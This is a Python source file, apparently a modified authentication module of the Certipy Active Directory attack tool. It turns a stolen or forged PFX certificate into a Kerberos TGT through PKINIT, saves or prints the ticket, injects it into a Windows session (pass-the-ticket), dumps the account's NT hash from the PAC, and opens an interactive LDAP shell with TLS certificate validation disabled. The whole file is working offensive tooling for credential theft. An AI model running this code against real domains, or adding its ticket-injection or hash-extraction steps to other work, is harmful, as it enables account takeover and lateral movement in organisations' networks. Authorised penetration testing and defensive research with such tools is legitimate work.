import argparse
import base64
from binascii import hexlify
import collections
import datetime
import os
import platform
import ssl
import sys
import tempfile
from random import getrandbits
from typing import Tuple, Union

import ldap3
from asn1crypto import cms, core
from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.examples.ldap_shell import LdapShell as _LdapShell
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncASRepPart,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from minikerberos.network.clientsocket import KerberosClientSocket
from minikerberos.common.target import KerberosTarget
from minikerberos.common.ccache import CCACHE

from certipy.lib.certificate import (
    cert_id_to_parts,
    cert_to_pem,
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    hash_digest,
    hashes,
    key_to_pem,
    load_pfx,
    rsa,
    x509,
)
from certipy.lib.errors import KRB5_ERROR_MESSAGES
from certipy.lib.logger import logging
from certipy.lib.target import Target
from certipy.ext.gettgtpkinit import myPKINIT
from certipy.ext.getnthash import GETPAC


class LdapShell(_LdapShell):
    def __init__(self, tcp_shell, domain_dumper, client):
        super().__init__(tcp_shell, domain_dumper, client)

        self.use_rawinput = True
        self.shell = tcp_shell

        self.prompt = "\n# "
        self.tid = None
        self.intro = "Type help for list of commands"
        self.loggedIn = True
        self.last_output = None
        self.completion = []
        self.client = client
        self.domain_dumper = domain_dumper

    def do_dump(self, line):
        logging.warning("Not implemented")

    def do_exit(self, line):
        print("Bye!")
        return True


class DummyDomainDumper:
    def __init__(self, root: str):
        self.root = root


class Authenticate:
    def __init__(
        self,
        target: Target = None,
        pfx: str = None,
        cert: x509.Certificate = None,
        key: rsa.RSAPublicKey = None,
        no_save: bool = False,
        no_hash: bool = False,
        ptt: bool = False,
        print: bool = False,
        kirbi: bool = False,
        ldap_shell: bool = False,
        ldap_port: int = 389,
        ldap_user_dn: str = None,
        user_dn: str = None,
        debug=False,
        **kwargs
    ):
        self.target = target
        self.pfx = pfx
        self.cert = cert
        self.key = key
        self.no_save = no_save
        self.no_hash = no_hash
        self.ptt = ptt
        self.print = print
        self.kirbi = kirbi
        self.ldap_shell = ldap_shell
        self.ldap_port = ldap_port
        self.ldap_user_dn = ldap_user_dn
        self.user_dn = user_dn
        self.verbose = debug
        self.kwargs = kwargs

        self.nt_hash: str = None
        self.lm_hash: str = None

        if self.pfx is not None:
            with open(self.pfx, "rb") as f:
                self.key, self.cert = load_pfx(f.read())

    def authenticate(
        self, username: str = None, domain: str = None, is_key_credential=False
    ):
        if username is None:
            username = self.target.username
        if domain is None:
            domain = self.target.domain

        if self.ldap_shell:
            return self.ldap_authentication()

        id_type = None
        identification = None
        object_sid = None
        if not is_key_credential:
            identifications = get_identifications_from_certificate(self.cert)

            if len(identifications) > 1:
                logging.info("Found multiple identifications in certificate")

                while True:
                    logging.info("Please select one:")
                    for i, identification in enumerate(identifications):
                        id_type, id_value = identification
                        print("    [%d] %s: %s" % (i, id_type, repr(id_value)))
                    idx = int(input("> "))

                    if idx >= len(identifications):
                        logging.warning("Invalid index")
                    else:
                        id_type, identification = identifications[idx]
                        break
            elif len(identifications) == 1:
                id_type, identification = identifications[0]
            else:
                id_type, identification = None, None

            cert_username, cert_domain = cert_id_to_parts([(id_type, identification)])

            object_sid = get_object_sid_from_certificate(self.cert)

            if not any([cert_username, cert_domain]):
                logging.warning(
                    "Could not find identification in the provided certificate"
                )

            if not username:
                username = cert_username
            elif cert_username:
                if username.lower() not in [
                    cert_username.lower(),
                    cert_username.lower() + "$",
                ]:
                    logging.warning(
                        (
                            "The provided username does not match the identification "
                            "found in the provided certificate: %s - %s"
                        )
                        % (repr(username), repr(cert_username))
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False

            if not domain:
                domain = cert_domain
            elif cert_domain:
                if (
                    domain.lower() != cert_domain.lower()
                    and not cert_domain.lower().startswith(
                        domain.lower().rstrip(".") + "."
                    )
                ):
                    logging.warning(
                        (
                            "The provided domain does not match the identification "
                            "found in the provided certificate: %s - %s"
                        )
                        % (repr(domain), repr(cert_domain))
                    )
                    res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                    if res.lower() == "n":
                        return False

        if not all([username, domain]) and not is_key_credential:
            logging.error(
                (
                    "Username or domain is not specified, and identification "
                    "information was not found in the certificate"
                )
            )
            return False

        if not any([len(username), len(domain)]):
            logging.error("Username or domain is invalid: %s@%s" % (username, domain))
            return False

        domain = domain.lower()
        username = username.lower()
        upn = "%s@%s" % (username, domain)

        if self.target.target_ip is None:
            self.target.target_ip = self.target.resolver.resolve(domain)

        logging.info("Using principal: %s" % upn)

        return self.kerberos_authentication(
            username,
            domain,
            is_key_credential,
            id_type,
            identification,
            object_sid,
            upn,
        )

    def ldap_authentication(
        self,
        domain: str = None,
    ) -> Union[str, bool]:
        key_file = tempfile.NamedTemporaryFile(delete=False)
        key_file.write(key_to_pem(self.key))
        key_file.close()

        cert_file = tempfile.NamedTemporaryFile(delete=False)
        cert_file.write(cert_to_pem(self.cert))
        cert_file.close()

        sasl_credentials = None
        if self.ldap_user_dn:
            sasl_credentials = "dn:%s" % self.ldap_user_dn

        tls = ldap3.Tls(
            local_private_key_file=key_file.name,
            local_certificate_file=cert_file.name,
            validate=ssl.CERT_NONE,
        )

        host = self.target.target_ip
        if host is None:
            host = domain
        host = "ldap://%s:%d" % (host, self.ldap_port)

        logging.info("Connecting to %s" % repr(host))
        ldap_server = ldap3.Server(
            host=host,
            get_info=ldap3.ALL,
            tls=tls,
            connect_timeout=5,
        )

        try:
            ldap_conn = ldap3.Connection(
                ldap_server,
                authentication=ldap3.SASL,
                sasl_mechanism=ldap3.EXTERNAL,
                sasl_credentials=sasl_credentials,
                auto_bind=ldap3.AUTO_BIND_TLS_BEFORE_BIND,
                raise_exceptions=True,
            )
        except ldap3.core.exceptions.LDAPUnavailableResult as e:
            logging.error("LDAP not configured for SSL/TLS connections")
            if self.verbose:
                raise e
            return False

        who_am_i = ldap_conn.extend.standard.who_am_i()
        logging.info(
            "Authenticated to %s as: %s" % (repr(self.target.target_ip), who_am_i)
        )

        root = ldap_server.info.other["defaultNamingContext"][0]
        domain_dumper = DummyDomainDumper(root)
        ldap_shell = LdapShell(sys, domain_dumper, ldap_conn)
        try:
            ldap_shell.cmdloop()
        except KeyboardInterrupt:
            print("Bye!\n")
            pass

        os.unlink(key_file.name)
        os.unlink(cert_file.name)

    def kerberos_authentication(
        self,
        username: str = None,
        domain: str = None,
        is_key_credential: bool = False,
        id_type: str = None,
        identification: str = None,
        object_sid: str = None,
        upn: str = None,
    ) -> Union[str, bool]:

        logging.info("Trying to get TGT...")

        try:
            mk_ccache, as_rep_key = gettgtpkinit(self.pfx, domain, username, self.target.dc_ip)
        except KerberosError as e:
            if e.getErrorCode() not in KRB5_ERROR_MESSAGES:
                logging.error("Got unknown Kerberos error: %#x" % e.getErrorCode())
                return False

            if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    ("Name mismatch between certificate and user %s" % repr(username))
                )
                if id_type is not None:
                    logging.error(
                        ("Verify that the username %s matches the certificate %s: %s")
                        % (repr(username), id_type, identification)
                    )
            elif "KDC_ERR_WRONG_REALM" in str(e) and not is_key_credential:
                logging.error(("Wrong domain name specified %s" % repr(domain)))
                if id_type is not None:
                    logging.error(
                        ("Verify that the domain %s matches the certificate %s: %s")
                        % (repr(domain), id_type, identification)
                    )
            elif "KDC_ERR_CERTIFICATE_MISMATCH" in str(e) and not is_key_credential:
                logging.error(
                    (
                        "Object SID mismatch between certificate and user %s"
                        % repr(username)
                    )
                )
                if object_sid is not None:
                    logging.error(
                        ("Verify that user %s has object SID %s")
                        % (repr(username), repr(object_sid))
                    )
            else:
                logging.error("Got error while trying to request TGT: %s" % str(e))

            return False

        logging.info("Got TGT")
        # Convert from minikerberos.CCache to impacket.CCACHE
        ccache = CCache(mk_ccache.to_bytes())

        krb_cred = ccache.toKRBCRED()

        if self.print:
            logging.info("Ticket:")
            print(base64.b64encode(krb_cred).decode())

        if not self.no_save or self.ptt:
            if not self.no_save:
                if self.kirbi:
                    kirbi_name = "%s.kirbi" % username.rstrip("$")
                    ccache.saveKirbiFile(kirbi_name)
                    logging.info("Saved Kirbi file to %s" % repr(kirbi_name))
                else:
                    self.ccache_name = "%s.ccache" % username.rstrip("$")
                    ccache.saveFile(self.ccache_name)
                    logging.info(
                        "Saved credential cache to %s" % repr(self.ccache_name)
                    )

            if self.ptt:
                krb_cred = ccache.toKRBCRED()
                logging.info("Trying to inject ticket into session")

                if platform.system().lower() != "windows":
                    logging.error("Not running on Windows platform. Aborting")
                else:
                    try:
                        from certipy.lib import sspi

                        res = sspi.submit_ticket(krb_cred)
                        if res:
                            logging.info("Successfully injected ticket into session")
                    except Exception as e:
                        logging.error(
                            "Failed to inject ticket into session: %s" % str(e)
                        )

        if not self.no_hash:
            logging.info("Trying to retrieve NT hash for %s" % repr(username))

            options = collections.namedtuple(
                'Options', 'dc_ip key',
            )
            options = options(
                self.target.dc_ip,
                hexlify(as_rep_key),
            )
            os.environ['KRB5CCNAME'] = self.ccache_name
            dumper = GETPAC(username, domain, options)
            dumper.dump()

        return False


def entry(options: argparse.Namespace) -> None:
    import logging as _logging
    _logging.getLogger('minikerberos').setLevel(
        "DEBUG" if options.debug else "WARN"
    )
    options.no_pass = True
    target = Target.create(
        domain=options.domain,
        username=options.username,
        dc_ip=options.dc_ip,
        target_ip=options.dc_ip,
        ns=options.ns,
        timeout=options.timeout,
        dns_tcp=options.dns_tcp,
        no_pass=True,
    )

    authenticate = Authenticate(target=target, **vars(options))
    authenticate.authenticate()


def gettgtpkinit(pfx, domain, username, dc_ip):
    # Copied and modified from:
    # https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
    dhparams = {
        'p':int('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
        'g':2
    }

    ini = myPKINIT.from_pfx(pfx, '', dhparams)
    req = ini.build_asreq(domain, username)
    logging.info('Requesting TGT')

    if not dc_ip:
        dc_ip = domain

    sock = KerberosClientSocket(KerberosTarget(dc_ip))
    res = sock.sendrecv(req)

    encasrep, session_key, cipher, t_key = ini.decrypt_asrep(res.native)
    ccache = CCACHE()
    ccache.add_tgt(res.native, encasrep)

    return ccache, t_key
